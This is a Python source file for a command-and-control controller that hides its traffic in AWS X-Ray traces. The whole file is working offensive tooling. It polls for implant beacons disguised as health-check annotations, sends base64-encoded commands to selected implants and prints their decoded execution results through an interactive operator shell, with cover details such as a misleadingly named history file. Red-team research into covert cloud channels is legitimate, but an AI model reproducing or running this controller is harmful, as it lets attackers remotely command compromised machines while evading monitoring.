#!/usr/bin/env python3
"""
AWS X-Ray C2 Controller v1.0.0
@RandomDhiraj
"""

import boto3
import json
import base64
import time
import threading
from datetime import datetime, timedelta
import sys
import readline
import atexit
import os

class XRayC2Controller:
    """C2 Controller for AWS X-Ray"""

    def __init__(self, region='eu-west-1'):
        self.xray = boto3.client('xray', region_name=region)
        self.active_implants = {}
        self.seen_traces = set()  
        self.running = True

    def poll_responses(self):
        """Continuously poll for beacons"""
        while self.running:
            try:
                end_time = datetime.utcnow()
                start_time = end_time - timedelta(minutes=5)

                response = self.xray.get_trace_summaries(
                    StartTime=start_time,
                    EndTime=end_time
                )

                for summary in response.get('TraceSummaries', []):
                    trace_id = summary.get('Id')

                    
                    if trace_id in self.seen_traces:
                        continue

                    
                    annotations = summary.get('Annotations', {})

                    
                    beacon_type = self.extract_annotation(annotations, 'service_type')
                    if beacon_type == 'health_check':
                        implant_id = self.extract_annotation(annotations, 'instance_id')

                        if implant_id:
                            
                            is_new = implant_id not in self.active_implants

                            
                            self.active_implants[implant_id] = {
                                'last_seen': datetime.utcnow(),
                                'trace_id': trace_id,
                                'os': self.extract_annotation(annotations, 'platform'),
                                'first_seen': self.active_implants.get(implant_id, {}).get('first_seen', datetime.utcnow()),
                                'beacon_count': self.active_implants.get(implant_id, {}).get('beacon_count', 0) + 1
                            }

                            
                            if is_new:
                                os_type = self.extract_annotation(annotations, 'platform') or 'unknown'
                                print(f"\n[+] New implant connected: {implant_id} ({os_type})")
                                print(f"xray-c2 ({self.get_selected()})> ", end='', flush=True)

                    
                    response_data = self.extract_annotation(annotations, 'execution_result')
                    if response_data:
                        implant_id = self.extract_annotation(annotations, 'instance_id')
                        if implant_id:
                            try:
                                decoded = base64.b64decode(response_data).decode()
                                print(f"\n[+] Response from {implant_id}:")
                                print(f"{decoded}")
                                print(f"xray-c2 ({self.get_selected()})> ", end='', flush=True)
                            except Exception as e:
                                print(f"\n[-] Failed to decode response: {e}")
                                print(f"xray-c2 ({self.get_selected()})> ", end='', flush=True)

                    
                    self.seen_traces.add(trace_id)

                    
                    if len(self.seen_traces) > 1000:
                        self.seen_traces = set(list(self.seen_traces)[-500:])

            except Exception as e:
                pass 

            time.sleep(10)

    def extract_annotation(self, annotations, key):
        
        if key in annotations:
            data = annotations[key]
            if isinstance(data, list) and len(data) > 0:
                return data[0].get('AnnotationValue', {}).get('StringValue', '')
        return None

    def get_selected(self):

        return getattr(self, 'selected_implant', 'none')

    def list_implants(self):

        if not self.active_implants:
            print("[-] No active implants")
            return

        print("\n[+] Active Implants:")
        print("-" * 70)

        sorted_implants = sorted(self.active_implants.items(),
                                key=lambda x: x[1]['first_seen'])

        for implant_id, info in sorted_implants:
            last_seen = info['last_seen']
            first_seen = info['first_seen']
            time_diff = datetime.utcnow() - last_seen

            if time_diff.seconds < 90:
                status = "\033[92mActive\033[0m" 
            elif time_diff.seconds < 180:
                status = "\033[93mIdle\033[0m"   
            else:
                status = "\033[91mInactive\033[0m"

            print(f"ID: {implant_id}")
            print(f"  Status: {status} (last beacon {time_diff.seconds}s ago)")
            print(f"  First Seen: {first_seen.strftime('%H:%M:%S')}")
            print(f"  Last Seen: {last_seen.strftime('%H:%M:%S')}")
            print(f"  Beacons: {info['beacon_count']}")
            if info.get('os'):
                print(f"  OS: {info['os']}")
            print("-" * 70)

    def send_command(self, implant_id, command):
        """Send command to implant via X-Ray trace"""
        print(f"[*] Sending command to {implant_id}: {command}")

        
        import random
        timestamp = str(int(time.time()))
        segment_id = ''.join(random.choices('0123456789abcdef', k=16))

        
        segment = {
            "name": "c2-controller",
            "id": segment_id,
            "trace_id": f"1-{int(time.time()):x}-{''.join(random.choices('0123456789abcdef', k=24))}",
            "start_time": time.time(),
            "end_time": time.time() + 0.001,
            "annotations": {
                f"config_{implant_id}": base64.b64encode(f"{timestamp}:{command}".encode()).decode()
            }
        }

        try:
            self.xray.put_trace_segments(
                TraceSegmentDocuments=[json.dumps(segment)]
            )
            print(f"[+] Command sent (implant will receive on next beacon)")
        except Exception as e:
            print(f"[-] Failed to send: {e}")

    def setup_readline(self):
        """Setup readline for command history and arrow key support"""
        try:
            
            histfile = os.path.join(os.path.expanduser("~"), ".aws_session_manager")
            
            
            try:
                readline.read_history_file(histfile)
            except FileNotFoundError:
                pass
            
            
            readline.set_history_length(1000)
            
            
            atexit.register(readline.write_history_file, histfile)
            
            
            readline.parse_and_bind('tab: complete')
            
            
            readline.parse_and_bind('"\e[A": previous-history')
            readline.parse_and_bind('"\e[B": next-history')
            
        except ImportError:
            
            pass

    def interactive_shell(self):
        """Interactive C2 shell"""

        
        self.setup_readline()

        # Start polling in background
        poll_thread = threading.Thread(target=self.poll_responses)
        poll_thread.daemon = True
        poll_thread.start()

        
        self.interactive = os.isatty(sys.stdin.fileno())

        print("""
┌─────────────────────────────────────────────────────────────┐
│                    X-Ray C2 Controller                      │
└─────────────────────────────────────────────────────────────┘

Available Commands:
  list              - List active implants
  use <id>          - Select implant
  cmd <command>     - Send command to selected implant
  info <id>         - Show implant details
  clear             - Clear screen
  exit / quit       - Exit controller

        """)

        self.selected_implant = None

        
        if not self.interactive:
            print("[*] Running in non-interactive mode. Polling for implants...")
            while self.running:
                time.sleep(10)
            return

        while self.running:
            try:
                prompt = f"xray-c2 ({self.selected_implant or 'none'})> "
                user_input = input(prompt).strip()

                if not user_input:
                    continue

                parts = user_input.split(' ', 1)
                command = parts[0].lower()

                if command == 'exit' or command == 'quit':
                    self.running = False
                    print("[*] Shutting down...")
                    break

                elif command == 'list' or command == 'ls':
                    self.list_implants()

                elif command == 'clear' or command == 'cls':
                    print("\033[2J\033[H")  # Clear screen

                elif command == 'use' and len(parts) > 1:
                    implant_id = parts[1]
                    if implant_id in self.active_implants:
                        self.selected_implant = implant_id
                        print(f"[+] Selected: {implant_id}")
                    else:
                        print(f"[-] Implant {implant_id} not found")
                        print("[*] Available implants:")
                        for iid in self.active_implants.keys():
                            print(f"    - {iid}")

                elif command == 'info' and len(parts) > 1:
                    implant_id = parts[1]
                    if implant_id in self.active_implants:
                        info = self.active_implants[implant_id]
                        print(f"\n[+] Implant Details: {implant_id}")
                        print(f"    OS: {info.get('os', 'unknown')}")
                        print(f"    First Seen: {info['first_seen']}")
                        print(f"    Last Seen: {info['last_seen']}")
                        print(f"    Total Beacons: {info['beacon_count']}")
                        print(f"    Last Trace ID: {info['trace_id']}")
                    else:
                        print(f"[-] Implant {implant_id} not found")

                elif command == 'cmd' and len(parts) > 1:
                    if not self.selected_implant:
                        print("[-] No implant selected. Use 'use <id>' first")
                    else:
                        self.send_command(self.selected_implant, parts[1])

                elif command == 'help' or command == '?':
                    print("""
Commands:
  list / ls         - List all active implants
  use <id>          - Select an implant for interaction
  cmd <command>     - Send command to selected implant
  info <id>         - Show detailed implant information
  clear / cls       - Clear the screen
  exit / quit       - Exit the controller
                    """)

                else:
                    print(f"[-] Unknown command: {command}")
                    print("[*] Type 'help' for commands")

            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                break
            except EOFError:
                
                time.sleep(1)
                continue
            except Exception as e:
                
                if "EOF" not in str(e):
                    print(f"[-] Error: {e}")

def main():
    
    try:
        session = boto3.Session()
        sts = session.client('sts')
        identity = sts.get_caller_identity()
        print(f"[+] AWS Account: {identity['Account']}")
        print(f"[+] Region: {session.region_name or 'eu-west-1'}")
    except Exception as e:
        print(f"[-] AWS Error: {e}")
        sys.exit(1)

    
    controller = XRayC2Controller()
    controller.interactive_shell()

if __name__ == "__main__":
    main()
